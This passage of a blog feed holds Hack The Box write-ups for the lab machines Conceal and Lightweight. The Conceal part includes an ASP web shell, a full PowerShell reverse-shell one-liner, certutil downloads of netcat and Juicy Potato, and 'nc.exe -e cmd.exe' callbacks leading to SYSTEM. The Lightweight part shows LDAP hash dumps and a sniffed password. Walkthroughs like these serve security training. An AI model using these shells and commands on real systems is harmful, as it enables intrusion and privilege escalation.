&amp;lt;b&amp;gt;The server's port:&amp;lt;/b&amp;gt;
&amp;lt;%Response.Write(Request.ServerVariables(&quot;server_port&quot;))%&amp;gt;
&amp;lt;/p&amp;gt;
&amp;lt;p&amp;gt;
&amp;lt;b&amp;gt;The server's software:&amp;lt;/b&amp;gt;
&amp;lt;%Response.Write(Request.ServerVariables(&quot;server_software&quot;))%&amp;gt;
&amp;lt;/p&amp;gt;
&amp;lt;p&amp;gt;
&amp;lt;b&amp;gt;The server's software:&amp;lt;/b&amp;gt;
&amp;lt;%Response.Write(Request.ServerVariables(&quot;LOCAL_ADDR&quot;))%&amp;gt;
&amp;lt;% szCMD = request(&quot;cmd&quot;)
thisDir = getCommandOutput(&quot;cmd /c&quot; &amp;amp; szCMD)
Response.Write(thisDir)%&amp;gt;
&amp;lt;/p&amp;gt;
&amp;lt;br&amp;gt;
&amp;lt;/BODY&amp;gt;
&amp;lt;/HTML&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/conceal/17.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/conceal/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-got-a-powershell-reverse-shell-&quot;&gt;I got a powershell reverse shell :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/conceal/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;payload-&quot;&gt;Payload :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;powershell -nop -c &quot;$client = New-Object System.Net.Sockets.TCPClient('10.10.xx.xx',1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&amp;gt;&amp;amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&amp;gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/conceal/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-got-user&quot;&gt;We got user.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;seimpersonateprivilege-juicy-potato-privilege-escalation-and-root-flag&quot;&gt;SeImpersonatePrivilege, Juicy Potato, Privilege Escalation and Root Flag&lt;/h3&gt;
&lt;h4 id=&quot;after-getting-user-the-privilege-escalation-is-easy-and-straightforward-before-doing-any-enumeration-i-checked-my-privileges-as-destitute-and-i-found-that-i-had-the-seimpersonateprivilege&quot;&gt;After getting user the privilege escalation is easy and straightforward. Before doing any enumeration I checked my privileges as &lt;code class=&quot;highlighter-rouge&quot;&gt;Destitute&lt;/code&gt; and I found that I had the &lt;code class=&quot;highlighter-rouge&quot;&gt;SeImpersonatePrivilege&lt;/code&gt;.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/conceal/21.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;this-means-that-we-can-apply-the-famous-attack-juicy-potato-you-can-read-about-it-on-the-official-github-repository-we-need-to-know-the-version-of-this-windows-to-pick-the-right-clsid&quot;&gt;This means that we can apply the famous attack &lt;code class=&quot;highlighter-rouge&quot;&gt;Juicy Potato&lt;/code&gt;. You can read about it on the &lt;a href=&quot;https://github.com/ohpe/juicy-potato&quot;&gt;official github repository&lt;/a&gt;. We need to know the version of this windows to pick the right &lt;code class=&quot;highlighter-rouge&quot;&gt;clsid&lt;/code&gt;.&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;systeminfo&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/conceal/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;its-microsoft-windows-10-enterprise-i-got-the-clsid-of--wuauserv-from-here-which-is--e60687f7-01a1-40aa-86ac-db1cbf673334&quot;&gt;It’s &lt;code class=&quot;highlighter-rouge&quot;&gt;Microsoft Windows 10 Enterprise&lt;/code&gt;. I got the &lt;code class=&quot;highlighter-rouge&quot;&gt;clsid&lt;/code&gt; of  &lt;code class=&quot;highlighter-rouge&quot;&gt;wuauserv&lt;/code&gt; from &lt;a href=&quot;https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_10_Enterprise&quot;&gt;here&lt;/a&gt; which is : &lt;code class=&quot;highlighter-rouge&quot;&gt;{e60687f7-01a1-40aa-86ac-db1cbf673334}&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;i-got-a-compiled-binary-of-juicy-potato-from-the-github-repository-i-hosted-it-on-a-python-simple-http-server-then-i-downloaded-it-on-the-machine-with-certutil-&quot;&gt;I got a compiled binary of &lt;code class=&quot;highlighter-rouge&quot;&gt;Juicy Potato&lt;/code&gt; from the github repository. I hosted it on a python simple http server then I downloaded it on the machine with &lt;code class=&quot;highlighter-rouge&quot;&gt;certutil&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;certutil -urlcache -split -f http://10.10.xx.xx/juicypotato.exe juicypotato.exe&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/conceal/23.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;however-i-had-some-problems-with-my-powershell-reverse-shell-and-it-couldnt-run-juicypotatoexe-properly-so-i-got-another-cmd-shell-with-nc-&quot;&gt;However I had some problems with my powershell reverse shell and it couldn’t run &lt;code class=&quot;highlighter-rouge&quot;&gt;juicypotato.exe&lt;/code&gt; properly so I got another &lt;code class=&quot;highlighter-rouge&quot;&gt;cmd&lt;/code&gt; shell with &lt;code class=&quot;highlighter-rouge&quot;&gt;nc&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;certutil -urlcache -split -f http://10.10.xx.xx/nc.exe nc.exe&lt;/code&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;nc.exe -e cmd.exe 10.10.xx.xx 1339&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/conceal/24.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/conceal/25.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-created-a-bat-file-that-executes--ncexe--e-cmdexe-1010xxxx-1340-to-get-me-a-reverse-shell-&quot;&gt;I created a &lt;code class=&quot;highlighter-rouge&quot;&gt;bat&lt;/code&gt; file that executes : &lt;code class=&quot;highlighter-rouge&quot;&gt;nc.exe -e cmd.exe 10.10.xx.xx 1340&lt;/code&gt; to get me a reverse shell :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;echo C:\users\Destitute\appdata\local\temp\nc.exe -e cmd.exe 10.10.xx.xx 1340 &amp;gt; rev.bat&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-i-ran-juicypotatoexe-and-made-it-execute-that-bat-file-&quot;&gt;Then I ran &lt;code class=&quot;highlighter-rouge&quot;&gt;juicypotato.exe&lt;/code&gt; and made it execute that &lt;code class=&quot;highlighter-rouge&quot;&gt;bat&lt;/code&gt; file :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;juicypotato.exe -p C:\users\Destitute\appdata\local\temp\rev.bat -l 1340 -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/conceal/26.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;it-worked-fine-and-we-got-a-reverse-shell-as-nt-authoritysystem&quot;&gt;It worked fine and we got a reverse shell as &lt;code class=&quot;highlighter-rouge&quot;&gt;nt authority\system&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/conceal/27.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/conceal/28.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-owned-root-&quot;&gt;And we owned root !&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
&lt;h4 id=&quot;dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---lightweight&quot;&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/lightweight/&quot;&gt;Hack The Box - Lightweight&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;next-hack-the-box-write-up--hack-the-box---chaos&quot;&gt;Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/chaos/&quot;&gt;Hack The Box - Chaos&lt;/a&gt;&lt;/h4&gt;
&lt;hr /&gt;</content><author><name></name></author><category term="Windows" /><category term="Networking" /><category term="ftp" /><category term="Web" /><category term="RCE" /><summary type="html">Quick Summary Hey guys today Conceal retired and here’s my write-up about it. Conceal was a straightforward fun box, The only tricky part about it is gaining IPSEC connection to gain access to some filtered services. That first part involved some guessing but after that everything is simple and very straightforward. I liked this machine and it was a very fun one. It’s a windows machine and its ip is 10.10.10.116, I added it to /etc/hosts as conceal.htb. Let’s jump right in. Nmap As always we will start with nmap to scan for open ports and services. nmap -sV -sT -sC conceal.htb And we got nothing ! I ran another nmap UDP scan on all ports : nmap -vvv -sU -o nmapudp conceal.htb --max-retries 0 The output was too long so I will show the only important part : It was not sure about port 161, but it showed that port 500 is open. I ran a third scan on ports 500 and 161 : nmap -p 161,500 -sV -sU -sC conceal.htb Full Output : ``` Nmap 7.70 scan initiated Fri May 17 16:37:52 2019 as: nmap -p 161,500 -sV -sU -sC -o nmapudp2 conceal.htb Nmap scan report for conceal.htb (10.10.10.116) Host is up (0.20s latency).</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/conceal/0.png" /></entry><entry><title type="html">Hack The Box - Lightweight</title><link href="http://localhost:4000/hack-the-box/lightweight/" rel="alternate" type="text/html" title="Hack The Box - Lightweight" /><published>2019-05-11T00:00:00+02:00</published><updated>2019-05-11T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/lightweight</id><content type="html" xml:base="http://localhost:4000/hack-the-box/lightweight/">&lt;hr /&gt;

&lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
&lt;h4 id=&quot;hey-guys-today-lightweight-retired-and-heres-my-write-up-about-it-lightweight-was-a-simple-and-a-straightforward-machine-i-had-fun-solving-it-and-i-liked-it-the-idea-behind-the-box-is-simple-we-get-initial-ssh-access-then-keep-escalating-privileges-until-we-reach-root-its-a-linux-machine-and-its-ip-is-101010119-i-added-it-to-etchosts-as-lightweighthtb-lets-jump-right-in&quot;&gt;Hey guys today Lightweight retired and here’s my write-up about it. Lightweight was a simple and a straightforward machine, I had fun solving it and I liked it. The idea behind the box is simple, We get initial ssh access then keep escalating privileges until we reach root. It’s a linux machine and its ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.119&lt;/code&gt;, I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;lightweight.htb&lt;/code&gt;. Let’s jump right in.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/lightweight/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
&lt;h4 id=&quot;as-always-we-will-start-with-nmap-to-scan-for-open-ports-and-services-&quot;&gt;As always we will start with nmap to scan for open ports and services :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT -sC lightweight.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/lightweight/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;3-ports-are-open--22-running-ssh-80-running-http-and-389-running-ldap-lets-check-ldap-first&quot;&gt;3 ports are open : 22 running ssh, 80 running http and 389 running ldap. Let’s check ldap first.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;ldap-enumeration&quot;&gt;Ldap Enumeration&lt;/h3&gt;
&lt;h4 id=&quot;to-enumerate-ldap-i-like-to-use-a-tool-called-ldapsearch-theres-also-an-nmap-script-called-ldap-search-that-can-do-the-same-thing&quot;&gt;To enumerate ldap I like to use a tool called &lt;code class=&quot;highlighter-rouge&quot;&gt;ldapsearch&lt;/code&gt;, There’s also an &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; script called &lt;code class=&quot;highlighter-rouge&quot;&gt;ldap-search&lt;/code&gt; that can do the same thing.&lt;/h4&gt;
&lt;h4 id=&quot;ldapsearch-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ldapsearch&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ldapsearch -x -h lightweight.htb -b &quot;dc=lightweight,dc=htb&quot;&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&quot;full-output-&quot;&gt;Full Output :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# extended LDIF
#
# LDAPv3
# base &amp;lt;dc=lightweight,dc=htb&amp;gt; with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# lightweight.htb
dn: dc=lightweight,dc=htb
objectClass: top
objectClass: dcObject
objectClass: organization
o: lightweight htb
dc: lightweight

# Manager, lightweight.htb
dn: cn=Manager,dc=lightweight,dc=htb
objectClass: organizationalRole
cn: Manager
description: Directory Manager

# People, lightweight.htb
dn: ou=People,dc=lightweight,dc=htb
objectClass: organizationalUnit
ou: People

# Group, lightweight.htb
dn: ou=Group,dc=lightweight,dc=htb
objectClass: organizationalUnit
ou: Group

# ldapuser1, People, lightweight.htb
dn: uid=ldapuser1,ou=People,dc=lightweight,dc=htb
uid: ldapuser1
cn: ldapuser1
sn: ldapuser1
mail: ldapuser1@lightweight.htb
objectClass: person
objectClass: organizationalPerson
objectClass: inetOrgPerson
objectClass: posixAccount
objectClass: top
objectClass: shadowAccount
userPassword:: e2NyeXB0fSQ2JDNxeDBTRDl4JFE5eTFseVFhRktweHFrR3FLQWpMT1dkMzNOd2R
 oai5sNE16Vjd2VG5ma0UvZy9aLzdONVpiZEVRV2Z1cDJsU2RBU0ltSHRRRmg2ek1vNDFaQS4vNDQv
shadowLastChange: 17691
shadowMin: 0
shadowMax: 99999
shadowWarning: 7
loginShell: /bin/bash
uidNumber: 1000
gidNumber: 1000
homeDirectory: /home/ldapuser1

# ldapuser2, People, lightweight.htb
dn: uid=ldapuser2,ou=People,dc=lightweight,dc=htb
uid: ldapuser2
cn: ldapuser2
sn: ldapuser2
mail: ldapuser2@lightweight.htb
objectClass: person
objectClass: organizationalPerson
objectClass: inetOrgPerson
objectClass: posixAccount
objectClass: top
objectClass: shadowAccount
userPassword:: e2NyeXB0fSQ2JHhKeFBqVDBNJDFtOGtNMDBDSllDQWd6VDRxejhUUXd5R0ZRdms
 zYm9heW11QW1NWkNPZm0zT0E3T0t1bkxaWmxxeXRVcDJkdW41MDlPQkUyeHdYL1FFZmpkUlF6Z24x
shadowLastChange: 17691
shadowMin: 0
shadowMax: 99999
shadowWarning: 7
loginShell: /bin/bash
uidNumber: 1001
gidNumber: 1001
homeDirectory: /home/ldapuser2

# ldapuser1, Group, lightweight.htb
dn: cn=ldapuser1,ou=Group,dc=lightweight,dc=htb
objectClass: posixGroup
objectClass: top
cn: ldapuser1
userPassword:: e2NyeXB0fXg=
gidNumber: 1000

# ldapuser2, Group, lightweight.htb
dn: cn=ldapuser2,ou=Group,dc=lightweight,dc=htb
objectClass: posixGroup
objectClass: top
cn: ldapuser2
userPassword:: e2NyeXB0fXg=
gidNumber: 1001

# search result
search: 2
result: 0 Success

# numResponses: 9
# numEntries: 8

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;nmap-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap --script=ldap-search lightweight.htb&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&quot;full-output--1&quot;&gt;Full Output :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Nmap 7.70 scan initiated Fri May 10 17:10:46 2019 as: nmap --script=ldap-search -o ldap.nmap lightweight.htb
Nmap scan report for lightweight.htb (10.10.10.119)
Host is up (0.17s latency).
Not shown: 997 filtered ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
389/tcp open  ldap
| ldap-search: 
|   Context: dc=lightweight,dc=htb
|     dn: dc=lightweight,dc=htb
|         objectClass: top
|         objectClass: dcObject
|         objectClass: organization
|         o: lightweight htb
|         dc: lightweight
|     dn: cn=Manager,dc=lightweight,dc=htb
|         objectClass: organizationalRole
|         cn: Manager
|         description: Directory Manager
|     dn: ou=People,dc=lightweight,dc=htb
|         objectClass: organizationalUnit
|         ou: People
|     dn: ou=Group,dc=lightweight,dc=htb
|         objectClass: organizationalUnit
|         ou: Group
|     dn: uid=ldapuser1,ou=People,dc=lightweight,dc=htb
|         uid: ldapuser1
|         cn: ldapuser1
|         sn: ldapuser1
|         mail: ldapuser1@lightweight.htb
|         objectClass: person
|         objectClass: organizationalPerson
|         objectClass: inetOrgPerson
|         objectClass: posixAccount
|         objectClass: top
|         objectClass: shadowAccount
|         userPassword: {crypt}$6$3qx0SD9x$Q9y1lyQaFKpxqkGqKAjLOWd33Nwdhj.l4MzV7vTnfkE/g/Z/7N5ZbdEQWfup2lSdASImHtQFh6zMo41ZA./44/
|         shadowLastChange: 17691
|         shadowMin: 0
|         shadowMax: 99999
|         shadowWarning: 7
|         loginShell: /bin/bash
|         uidNumber: 1000
|         gidNumber: 1000
|         homeDirectory: /home/ldapuser1
|     dn: uid=ldapuser2,ou=People,dc=lightweight,dc=htb
|         uid: ldapuser2
|         cn: ldapuser2
|         sn: ldapuser2
|         mail: ldapuser2@lightweight.htb
|         objectClass: person
|         objectClass: organizationalPerson
|         objectClass: inetOrgPerson
|         objectClass: posixAccount
|         objectClass: top
|         objectClass: shadowAccount
|         userPassword: {crypt}$6$xJxPjT0M$1m8kM00CJYCAgzT4qz8TQwyGFQvk3boaymuAmMZCOfm3OA7OKunLZZlqytUp2dun509OBE2xwX/QEfjdRQzgn1
|         shadowLastChange: 17691
|         shadowMin: 0
|         shadowMax: 99999
|         shadowWarning: 7
|         loginShell: /bin/bash
|         uidNumber: 1001
|         gidNumber: 1001
|         homeDirectory: /home/ldapuser2
|     dn: cn=ldapuser1,ou=Group,dc=lightweight,dc=htb
|         objectClass: posixGroup
|         objectClass: top
|         cn: ldapuser1
|         userPassword: {crypt}x
|         gidNumber: 1000
|     dn: cn=ldapuser2,ou=Group,dc=lightweight,dc=htb
|         objectClass: posixGroup
|         objectClass: top
|         cn: ldapuser2
|         userPassword: {crypt}x
|_        gidNumber: 1001

# Nmap done at Fri May 10 17:11:03 2019 -- 1 IP address (1 host up) scanned in 17.35 seconds

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;if-we-take-a-look-at-ldapsearch-results-&quot;&gt;If we take a look at &lt;code class=&quot;highlighter-rouge&quot;&gt;ldapsearch&lt;/code&gt; results :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/lightweight/2.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/lightweight/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-have-some-info-for-2-users--ldapuser1-and-ldapuser2-userpassword-is-a-base64-encoded-string-i-decoded-it-and-got-the-same-hashes-i-got-from-ldap-search-nmap-script-&quot;&gt;We have some info for 2 users : &lt;code class=&quot;highlighter-rouge&quot;&gt;ldapuser1&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;ldapuser2&lt;/code&gt;. &lt;code class=&quot;highlighter-rouge&quot;&gt;userPassword&lt;/code&gt; is a base64 encoded string. I decoded it and got the same hashes I got from &lt;code class=&quot;highlighter-rouge&quot;&gt;ldap-search&lt;/code&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; script :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/lightweight/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;however-i-tried-to-crack-the-hashes-and-they-didnt-crack-lets-check-http&quot;&gt;However, I tried to crack the hashes and they didn’t crack. Let’s check http.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;http&quot;&gt;HTTP&lt;/h3&gt;
&lt;h4 id=&quot;usually-i-use-some-tools-for-web-like-gobuster-for-example-but-this-time-we-cant-do-that-because-we-will-get-blocked-as-you-can-see-&quot;&gt;Usually I use some tools for web like &lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; for example, But this time We can’t do that because we will get blocked as you can see :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/lightweight/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;also-the-info-page-is-saying-the-same-thing-&quot;&gt;Also the &lt;code class=&quot;highlighter-rouge&quot;&gt;info&lt;/code&gt; page is saying the same thing :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/lightweight/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-its-also-saying-if-you-like-to-get-in-the-box-please-go-to-the-user-page-lets-check-user-&quot;&gt;And it’s also saying &lt;code class=&quot;highlighter-rouge&quot;&gt;If you like to get in the box, please go to the user page&lt;/code&gt;. Let’s check &lt;code class=&quot;highlighter-rouge&quot;&gt;user&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/lightweight/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;so-we-can-login-with-ssh-with-the-ip-as-the-username-and-the-password-lets-try-&quot;&gt;So we can login with ssh with the ip as the username and the password. Let’s try :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/lightweight/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;its-working-&quot;&gt;It’s working !&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;tcpdump-capabilities-user-flag&quot;&gt;Tcpdump Capabilities, User Flag&lt;/h3&gt;
&lt;h4 id=&quot;one-of-the-things-i-always-check-when-enumerating-linux-filesystem-is-the-binary-capabilities-so-i-used-getcap-on-some-directories-like-bin-usrbin-and-usrsbin-i-noticed-that-tcpdump-has-cap_net_admincap_net_rawep-capabilities&quot;&gt;One of the things I always check when enumerating linux filesystem is the binary capabilities. So I used &lt;code class=&quot;highlighter-rouge&quot;&gt;getcap&lt;/code&gt; on some directories like &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/bin&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/sbin&lt;/code&gt;. I noticed that &lt;code class=&quot;highlighter-rouge&quot;&gt;tcpdump&lt;/code&gt; has &lt;code class=&quot;highlighter-rouge&quot;&gt;cap_net_admin,cap_net_raw+ep&lt;/code&gt; capabilities.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/lightweight/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;from-the-linux-capabilities-manual-i-found-some-info-about-these-capabilities-&quot;&gt;From the &lt;a href=&quot;http://man7.org/linux/man-pages/man7/capabilities.7.html&quot;&gt;Linux Capabilities Manual&lt;/a&gt; I found some info about these capabilities :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;**CAP_NET_ADMIN**
              Perform various network-related operations:
              * interface configuration;
              * administration of IP firewall, masquerading, and accounting;
              * modify routing tables;
              * bind to any address for transparent proxying;
              * set type-of-service (TOS)
              * clear driver statistics;
              * set promiscuous mode;
              * enabling multicasting;
              * use [setsockopt(2)](http://man7.org/linux/man-pages/man2/setsockopt.2.html) to set the following socket options:
                **SO_DEBUG**, **SO_MARK**, **SO_PRIORITY** (for a priority outside the
                range 0 to 6), **SO_RCVBUFFORCE**, and **SO_SNDBUFFORCE**.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; **CAP_NET_RAW**
              * Use RAW and PACKET sockets;
              * bind to any address for transparent proxying.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;great-i-ran-tcpdump-on-all-the-interfaces-and-saved-the-output-to-capturedpcap-and-i-left-it-for-some-time-&quot;&gt;Great. I ran &lt;code class=&quot;highlighter-rouge&quot;&gt;tcpdump&lt;/code&gt; on all the interfaces and saved the output to &lt;code class=&quot;highlighter-rouge&quot;&gt;captured.pcap&lt;/code&gt; and I left it for some time :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;tcpdump -i any -w captured.pcap&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/lightweight/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-downloaded-the-pcap-on-my-box-to-open-it-with-wireshark-&quot;&gt;I downloaded the &lt;code class=&quot;highlighter-rouge&quot;&gt;pcap&lt;/code&gt; on my box to open it with &lt;code class=&quot;highlighter-rouge&quot;&gt;wireshark&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;scp 10.10.xx.xx@lightweight.htb:/home/10.10.xx.xx/captured.pcap ./&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/lightweight/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;in-wireshark-i-noticed-an-ldap-request-&quot;&gt;In &lt;code class=&quot;highlighter-rouge&quot;&gt;wireshark&lt;/code&gt; I noticed an &lt;code class=&quot;highlighter-rouge&quot;&gt;LDAP&lt;/code&gt; request :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/lightweight/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-looked-at-it-and-found-that-its-an-authentication-request-&quot;&gt;I looked at it and found that it’s an authentication request :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/lightweight/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;now-we-have-the-password-for-ldapuser2--8bc8251332abe1d7f105d3e53ad39ac2-lets-su-&quot;&gt;Now we have the password for &lt;code class=&quot;highlighter-rouge&quot;&gt;ldapuser2&lt;/code&gt; :	&lt;code class=&quot;highlighter-rouge&quot;&gt;8bc8251332abe1d7f105d3e53ad39ac2&lt;/code&gt;. Lets &lt;code class=&quot;highlighter-rouge&quot;&gt;su&lt;/code&gt; :&lt;/h4&gt;
